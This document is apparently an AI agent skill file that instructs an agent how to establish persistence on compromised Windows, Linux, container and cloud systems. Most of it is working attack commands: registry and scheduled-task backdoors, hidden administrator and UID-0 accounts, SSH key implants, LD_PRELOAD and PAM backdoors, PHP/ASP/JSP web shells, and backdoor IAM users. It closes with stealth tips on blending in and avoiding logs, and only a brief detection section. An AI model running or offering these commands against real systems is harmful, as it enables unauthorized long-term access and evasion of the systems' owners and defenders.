---
name: establishing-persistence
description: Establish persistence on Windows and Linux systems using registry keys, scheduled tasks, services, cron jobs, SSH keys, backdoor accounts, and rootkits. Use when performing post-exploitation or maintaining long-term access.
---

# Establishing Persistence

## When to Use

- Maintaining access to compromised systems
- Post-exploitation techniques
- Red team operations
- Persistence testing
- Backdoor creation

## Windows Persistence

### Registry Run Keys

```cmd
# HKCU Run (current user)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# HKLM Run (all users - requires admin)
reg add "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# RunOnce (runs once then deletes)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"

# Policies Run
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run" /v Backdoor /t REG_SZ /d "C:\Windows\Temp\backdoor.exe"
```

**PowerShell Registry:**
```powershell
# HKCU Run
New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "Backdoor" -Value "C:\Windows\Temp\backdoor.exe" -PropertyType String

# Verify
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
```

### Scheduled Tasks

```cmd
# Create task to run at logon
schtasks /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\backdoor.exe" /sc onlogon /ru System

# Run every hour
schtasks /create /tn "SystemCheck" /tr "C:\Windows\Temp\backdoor.exe" /sc hourly /ru System

# Run daily at specific time
schtasks /create /tn "Maintenance" /tr "C:\Windows\Temp\backdoor.exe" /sc daily /st 09:00 /ru System

# Run on system startup
schtasks /create /tn "StartupTask" /tr "C:\Windows\Temp\backdoor.exe" /sc onstart /ru System

# List tasks
schtasks /query /fo LIST /v
```

**PowerShell Scheduled Task:**
```powershell
$action = New-ScheduledTaskAction -Execute "C:\Windows\Temp\backdoor.exe"
$trigger = New-ScheduledTaskTrigger -AtLogon
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "WindowsUpdate" -Description "System Maintenance"
```

### Windows Services

```cmd
# Create new service
sc create "WindowsUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto
sc description "WindowsUpdate" "Keeps your Windows system updated"

# Start service
sc start "WindowsUpdate"

# Modify existing service
sc config "ServiceName" binPath= "C:\Windows\Temp\backdoor.exe"

# Service with SYSTEM privileges
sc create "SecurityUpdate" binPath= "C:\Windows\Temp\backdoor.exe" start= auto obj= LocalSystem
```

**PowerShell Service:**
```powershell
New-Service -Name "WindowsDefender" -BinaryPathName "C:\Windows\Temp\backdoor.exe" -DisplayName "Windows Defender Update" -StartupType Automatic
Start-Service "WindowsDefender"
```

### WMI Event Subscription

```powershell
# Create WMI event to run payload on logon
$Filter = Set-WmiInstance -Namespace root\subscription -Class __EventFilter -Arguments @{
    Name = "UserLogon";
    EventNamespace = "root\cimv2";
    QueryLanguage = "WQL";
    Query = "SELECT * FROM __InstanceCreationEvent WITHIN 15 WHERE TargetInstance ISA 'Win32_LogonSession'";
}

$Consumer = Set-WmiInstance -Namespace root\subscription -Class CommandLineEventConsumer -Arguments @{
    Name = "RunBackdoor";
    CommandLineTemplate = "C:\Windows\Temp\backdoor.exe";
}

Set-WmiInstance -Namespace root\subscription -Class __FilterToConsumerBinding -Arguments @{
    Filter = $Filter;
    Consumer = $Consumer;
}
```

### Startup Folder

```cmd
# Current user startup
copy backdoor.exe "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"

# All users startup (requires admin)
copy backdoor.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdate.exe"
```

### DLL Hijacking

```cmd
# Place malicious DLL in application directory
# Common DLL hijacking candidates:
# - version.dll
# - wlbsctrl.dll
# - oci.dll

copy evil.dll "C:\Program Files\Application\version.dll"
```

### Image File Execution Options

```cmd
# Hijack executable launch
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\Windows\System32\cmd.exe"

# Now pressing Shift 5 times at login opens cmd.exe
```

### AppInit_DLLs

```cmd
# Load DLL into every process (requires admin)
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "C:\Windows\Temp\evil.dll"
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows" /v LoadAppInit_DLLs /t REG_DWORD /d 1
```

### Backdoor Accounts

```cmd
# Create hidden admin account
net user backdoor P@ssw0rd /add
net localgroup Administrators backdoor /add

# Hide account (ends with $)
net user backdoor$ P@ssw0rd /add
net localgroup Administrators backdoor$ /add

# Disable account logging
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0
```

## Linux Persistence

### Cron Jobs

```bash
# User crontab (no sudo needed)
crontab -e
# Add:
@reboot /tmp/.backdoor
0 * * * * /tmp/.backdoor  # Every hour

# System-wide cron (requires root)
echo "@reboot root /tmp/.backdoor" >> /etc/crontab

# Cron.d directory
echo "* * * * * root /tmp/.backdoor" > /etc/cron.d/backdoor

# Daily/hourly cron scripts
cp backdoor.sh /etc/cron.daily/update
chmod +x /etc/cron.daily/update
```

### Systemd Services

```bash
# Create service file
cat > /etc/systemd/system/backdoor.service << EOF
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=/tmp/.backdoor
Restart=always

[Install]
WantedBy=multi-user.target
EOF

# Enable and start
systemctl daemon-reload
systemctl enable backdoor.service
systemctl start backdoor.service

# Verify
systemctl status backdoor.service
```

### RC Scripts (Init.d)

```bash
# Create init script
cat > /etc/init.d/backdoor << EOF
#!/bin/bash
### BEGIN INIT INFO
# Provides: backdoor
# Required-Start: \$network
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
### END INIT INFO
/tmp/.backdoor &
EOF

chmod +x /etc/init.d/backdoor
update-rc.d backdoor defaults
```

### SSH Keys

```bash
# Add attacker's public key
mkdir -p /root/.ssh
echo "ssh-rsa AAAA...attacker_key" >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys

# For specific user
echo "ssh-rsa AAAA...attacker_key" >> /home/user/.ssh/authorized_keys
```

### .bashrc / .bash_profile

```bash
# Add to user's .bashrc
echo "/tmp/.backdoor &" >> ~/.bashrc
echo "/tmp/.backdoor &" >> ~/.bash_profile

# Root .bashrc
echo "/tmp/.backdoor &" >> /root/.bashrc
```

### LD_PRELOAD

```bash
# Hijack library loading
echo "/tmp/evil.so" > /etc/ld.so.preload

# Will load evil.so into every process
```

### MOTD Backdoor

```bash
# Add to message of the day scripts (runs on SSH login)
echo "/tmp/.backdoor &" >> /etc/update-motd.d/00-header
chmod +x /etc/update-motd.d/00-header
```

### APT/Package Manager

```bash
# APT hook (Debian/Ubuntu)
cat > /etc/apt/apt.conf.d/99backdoor << EOF
APT::Update::Pre-Invoke {"/tmp/.backdoor &";};
EOF

# Runs before apt update
```

### Git Hooks

```bash
# If git repositories exist
echo "/tmp/.backdoor &" > /path/to/repo/.git/hooks/post-checkout
chmod +x /path/to/repo/.git/hooks/post-checkout

# Triggers on git checkout
```

### Backdoor Accounts

```bash
# Create backdoor user with root UID
useradd -u 0 -o -g 0 -M -d /root -s /bin/bash backdoor
echo "backdoor:P@ssw0rd" | chpasswd

# Or add to /etc/passwd directly
echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
echo "backdoor:$(openssl passwd -6 P@ssw0rd):::::::" >> /etc/shadow
```

### PAM Backdoor

```bash
# Add to /etc/pam.d/sshd or /etc/pam.d/common-auth
# Use custom PAM module that accepts magic password
auth sufficient pam_unix.so try_first_pass
auth sufficient /lib/security/pam_backdoor.so
```

## Web Shells

### PHP Web Shell

```php
<?php
// simple.php
system($_GET['cmd']);
?>

// Advanced
<?php
if($_GET['key'] == 'secret') {
    eval($_POST['cmd']);
}
?>
```

**Upload Locations:**
```bash
# Web roots
/var/www/html/
/var/www/
/usr/share/nginx/html/
C:\inetpub\wwwroot\

# Hidden names
.htaccess.php
favicon.ico.php
robots.txt.php
```

### ASP/ASPX Web Shell

```asp
<%@ Page Language="C#" %>
<%
Response.Write(System.Diagnostics.Process.Start("cmd.exe","/c " + Request["cmd"]).StandardOutput.ReadToEnd());
%>
```

### JSP Web Shell

```jsp
<%
Runtime.getRuntime().exec(request.getParameter("cmd"));
%>
```

## Container Persistence

**Docker:**
```bash
# Modify container to restart always
docker update --restart=always container_name

# Add to docker-compose.yml
restart: always

# Create new container with backdoor
docker run -d --restart=always --name backdoor evil_image
```

**Kubernetes:**
```yaml
# DaemonSet (runs on all nodes)
apiVersion: apps/v1
kind: DaemonSet
metadata:
  name: backdoor
spec:
  selector:
    matchLabels:
      name: backdoor
  template:
    metadata:
      labels:
        name: backdoor
    spec:
      containers:
      - name: backdoor
        image: attacker/backdoor:latest
```

## Cloud Persistence

### AWS

```bash
# Create IAM user
aws iam create-user --user-name backdoor

# Attach admin policy
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# Create access key
aws iam create-access-key --user-name backdoor

# Lambda function persistence
# Create Lambda that executes periodically via CloudWatch Events
```

### Azure

```bash
# Create service principal
az ad sp create-for-rbac --name "backdoor" --role Contributor

# Create managed identity
az identity create --name backdoor --resource-group RG

# Function App persistence
# Deploy Azure Function that runs on schedule
```

## Rootkits

**User-mode Rootkit:**
- Hook library functions
- Process hiding
- File hiding
- Network hiding

**Kernel-mode Rootkit:**
- Loadable kernel module (LKM)
- Hooks system calls
- Harder to detect
- Requires root

```bash
# Example LKM (requires kernel headers)
# Compile and load malicious kernel module
insmod backdoor.ko
```

## Persistence Detection

**Windows:**
```powershell
# Check Run keys
Get-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"

# Check scheduled tasks
Get-ScheduledTask | Where-Object {$_.TaskPath -notlike "\Microsoft*"}

# Check services
Get-Service | Where-Object {$_.StartType -eq "Automatic"}

# Check WMI subscriptions
Get-WMIObject -Namespace root\Subscription -Class __EventFilter
Get-WMIObject -Namespace root\Subscription -Class __EventConsumer
Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding
```

**Linux:**
```bash
# Check cron jobs
crontab -l
ls -la /etc/cron.*
cat /etc/crontab

# Check systemd services
systemctl list-unit-files --type=service --state=enabled

# Check init scripts
ls -la /etc/init.d/

# Check SSH authorized_keys
cat ~/.ssh/authorized_keys
cat /root/.ssh/authorized_keys

# Check LD_PRELOAD
cat /etc/ld.so.preload

# Check for hidden files
find / -name ".*"
```

## OpSec Tips

- **Blend in** - Use system-like names (WindowsUpdate, SystemCheck)
- **Redundancy** - Establish multiple persistence methods
- **Stealth** - Avoid noisy methods that generate logs
- **Cleanup** - Remove persistence when engagement ends
- **Timestamps** - Match file timestamps to system files

## Tools

- **PowerSploit** - PowerShell post-exploitation
- **Empire** - Post-exploitation framework
- **Metasploit** - Persistence modules
- **SILENTTRINITY** - Modern C2 framework
- **Covenant** - .NET C2 framework

## References

- https://attack.mitre.org/tactics/TA0003/
- https://book.hacktricks.xyz/
- https://github.com/PowerShellMafia/PowerSploit
